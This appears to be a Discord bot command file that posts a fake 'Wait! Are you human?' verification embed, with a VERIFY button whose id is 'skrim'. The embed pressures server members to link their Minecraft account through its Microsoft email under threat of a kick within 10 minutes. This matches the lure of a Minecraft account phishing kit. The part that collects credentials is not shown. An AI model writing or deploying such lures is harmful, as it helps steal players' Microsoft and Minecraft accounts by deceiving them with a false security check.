const { SlashCommandBuilder } = require("@discordjs/builders");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events } = require('discord.js')







module.exports = {
    data: new SlashCommandBuilder()
        .setName('embed')
        .setDescription('Sends verify embed!'),
    async execute(interaction) {
        await interaction.deferReply({
            ephemeral: true
        })
        var embed = new EmbedBuilder()
            .setTitle('<a:cross:1124119438598357093> **Wait! Are you human?**')
            .setDescription(`Due to constant raids, you are required to verify your Minecraft account to continue to your server. Read our FAQ below.

            **FAQ**
            
            **Q: What is this verification system?**
            
            > A: This verification system is a way to prevent bots from joining our server. It is also a way to link your Discord account to your Minecraft account to prevent alts being used in activities such as giveaways. 
            
            **Q: What email do I use?**
            
            > A: You use the email that is linked to your Minecraft account. This bot uses Microsoft authentication to verify your Minecraft account.

            **<:warnxd:1124120542065197177> WARNING <:warnxd:1124120542065197177>**

            You will be automatically kicked from this server if you remain unverified for 10 minutes.`)      
      .setColor(0xFF0000);
        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('skrim')
                    .setLabel('VERIFY')
                    .setStyle(ButtonStyle.Danger),
            );

        await interaction.editReply({
           embeds: [{ title: 'Embed Created!', color: parseInt('FF0000', 16), timestamp: new Date().toISOString() }],
            ephemeral: true
        });
        await interaction.channel.send({ embeds: [embed], components: [row] });
    },
};